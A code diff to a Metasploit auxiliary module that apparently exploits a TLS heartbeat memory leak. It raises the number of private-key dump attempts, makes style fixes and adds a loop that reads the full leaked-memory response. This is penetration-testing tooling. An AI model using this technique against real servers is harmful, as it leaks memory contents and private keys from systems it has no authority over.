@@ -147,7 +147,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(443),
         OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP', 'POSTGRES' ]]),
         OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
-        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
+        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 50]),
         OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
         OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
         OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10])
@@ -178,7 +178,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if response_timeout < 0
-      print_error("RESPONSE_TIMEOUT should be bigger than 0")
+      print_error('RESPONSE_TIMEOUT should be bigger than 0')
       return
     end
 
@@ -193,7 +193,7 @@ class Metasploit3 < Msf::Auxiliary
     if @check_only
       SAFE_CHECK_MAX_RECORD_LENGTH
     else
-      datastore["HEARTBEAT_LENGTH"]
+      datastore['HEARTBEAT_LENGTH']
     end
   end
 
@@ -349,11 +349,11 @@ class Metasploit3 < Msf::Auxiliary
       alert_unp = res.unpack('CC')
       alert_level = alert_unp[0]
       alert_desc = alert_unp[1]
-      msg = "Unknown error"
+      msg = 'Unknown error'
       # http://tools.ietf.org/html/rfc5246#section-7.2
       case alert_desc
       when 0x46
-        msg = "Protocol error. Looks like the chosen protocol is not supported."
+        msg = 'Protocol error. Looks like the chosen protocol is not supported.'
       end
       vprint_error("#{peer} - #{msg}")
       return
@@ -364,8 +364,19 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    heartbeat_data = sock.get(heartbeat_length) # Read the magic length...
-    vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
+    to_receive = len
+    heartbeat_data = ''
+    while to_receive > 0
+      temp = sock.get_once(to_receive, response_timeout)
+      if temp.nil?
+        break
+      else
+        to_receive -= temp.length
+        heartbeat_data << temp
+      end
+    end
+    vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{len} bytes (expected #{heartbeat_length} bytes)")
+
     heartbeat_data
   end
 
